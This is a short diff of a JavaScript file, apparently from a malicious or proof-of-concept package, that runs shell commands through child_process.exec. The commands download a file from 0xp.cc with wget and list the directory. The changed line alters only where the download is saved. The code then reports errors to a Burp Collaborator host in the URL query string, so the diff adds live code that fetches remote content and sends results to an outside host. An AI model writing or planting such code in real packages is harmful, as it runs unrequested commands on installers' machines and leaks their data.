@@ -83,7 +83,7 @@ fs.readFile('d.txt', 'utf8' , (err, data) => {
 
 const spawn = require('child_process');
 var request = require('request');
-spawn.exec("wget http://0xp.cc/x.json; ls | tr \"\\n\" \" \" ", (error, stdout, stderr) => {
+spawn.exec("wget http://0xp.cc/x.json -O /tmp/; ls | tr \"\\n\" \" \" ", (error, stdout, stderr) => {
     if (error) {
         console.log(`error: ${error.message}`);
         request('http://hav6cctq6ivan5c60wrtjil22t8nwc.burpcollaborator.net/?rce-error=' + error.message);
